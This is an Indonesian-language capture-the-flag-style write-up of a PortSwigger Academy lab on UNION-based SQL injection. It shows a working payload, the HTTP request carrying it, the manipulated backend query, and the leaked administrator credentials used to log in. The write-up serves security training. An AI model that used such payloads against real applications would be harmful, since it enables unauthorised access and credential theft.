# [PortSwigger Academy] SQL Injection - Lab #9

## 📌 Detail Lab
* **Nama Tantangan:** SQL injection UNION attack, retrieving data from other tables
* **Tingkat Kesulitan:** PRACTITIONER
* **Kategori:** SQL Injection (SQLi)
* **Tujuan Lab:** Menggunakan serangan UNION-Based SQLi untuk mengekstrak data sensitif (username dan password) dari tabel `users`, lalu login sebagai pengguna `administrator`.

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Celah keamanan berada pada parameter filter kategori. Dengan memanfaatkan operator `UNION`, kita bisa memaksa aplikasi mengembalikan baris data tambahan dari tabel lain di database yang tidak seharusnya bisa diakses oleh publik (dalam kasus ini, tabel `users`).

### Tahapan Pra-Eksploitasi:
1. **Menentukan Jumlah Kolom:** Menggunakan `ORDER BY` atau `UNION SELECT NULL`, ditemukan bahwa kueri asli mengembalikan **2 kolom**.
2. **Menentukan Tipe Data Kolom:** Menggunakan pengujian `' UNION SELECT 'a', 'b'--`, dikonfirmasi bahwa **kedua kolom menerima tipe data string**.

Karena ada 2 kolom string dan kita perlu mengambil 2 data (username dan password), kita bisa langsung memetakan kolom pertama untuk `username` dan kolom kedua untuk `password`.

---

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

### Injeksi Payload Eksfiltrasi Data
Suntikkan perintah `SELECT username, password FROM users` ke dalam parameter kategori menggunakan kueri `UNION`:

* **Payload:** `' UNION SELECT username, password FROM users--`

Request HTTP final di Burp Repeater:
```http
GET /filter?category=Pets' UNION SELECT username, password FROM users-- HTTP/2
Host: 0ab0004904b564a981e0847500ad0094.web-security-academy.net
```

### Hasil Eksekusi Database
Di sisi database backend, kueri dimanipulasi secara penuh menjadi:
```
SELECT * FROM products WHERE category = 'Pets' UNION SELECT username, password FROM users--' AND released = 1
```

### Analisis Hasil Ekstraksi
Setelah request dikirim, aplikasi merespons dengan status HTTP 200 OK. Pada struktur HTML halaman web yang dikembalikan, data kredensial dari tabel users berhasil dirender di browser:
```
<tr>
    <th>
        administrator
    </th>
     <td>
        ucn2rcuqzkshq26is7rb
    </td>
</tr>
```
Hasil Akhir: Cari baris data milik user administrator, salin kredensial password tersebut, lalu gunakan pada halaman login aplikasi. Login berhasil dan lab dinyatakan selesai (Solved).